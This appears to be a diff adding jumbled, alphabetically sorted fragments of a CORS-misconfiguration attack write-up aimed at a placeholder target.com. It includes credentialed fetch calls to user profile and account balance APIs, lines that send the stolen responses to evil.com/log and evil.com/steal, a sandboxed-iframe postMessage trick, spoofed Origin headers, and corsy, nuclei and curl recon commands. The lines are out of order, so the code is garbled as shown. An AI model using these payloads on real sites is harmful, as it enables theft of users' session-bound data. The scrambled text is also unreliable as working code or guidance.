@@ -1,0 +1,35 @@
+.*
+.then(d => fetch('https://evil.com/log?data=' + btoa(JSON.stringify(d))));
+.then(d => top.postMessage(d, "*"));
+.then(r => r.json())
+/^https?:\/\/.*\.target\.com$/
+/api/v1/payments
+/internal/api/admin/users
+</script>
+</script>'></iframe>
+<iframe sandbox="allow-scripts" srcdoc='<script>
+<script>
+Access-Control-Allow-Origin: https://evil.com
+Content-Type: text/plain
+Cookie: session=valid_token
+GET /api/v1/user/profile
+GET /api/v1/user/profile HTTP/1.1
+GET /api/v2/account/balance
+GET /internal/api/admin/users
+Origin: https://evil.com
+Origin: https://evil.target.com.attacker.com
+POST /api/admin/users/delete HTTP/1.1
+[ -n "$result" ] && echo "$url: $result"
+corsy -u https://target.com -t 10 --headers "Cookie: session=TOKEN"
+curl -sI https://target.com/api/me \
+done < recon/target/api-endpoints.txt
+fetch("https://evil.com/steal?d=" + encodeURIComponent(JSON.stringify(e.data)));
+fetch("https://target.com/api/v2/account/balance", {credentials: "include"})
+fetch('https://target.com/api/v1/user/profile', {credentials: 'include'})
+https://static.target.com/poc.html
+nuclei -u https://target.com -t cors-misconfiguration.yaml
+result=$(curl -sI "$url" \
+text/plain
+window.addEventListener("message", e => {
+{"userId": "victim123"}
+});
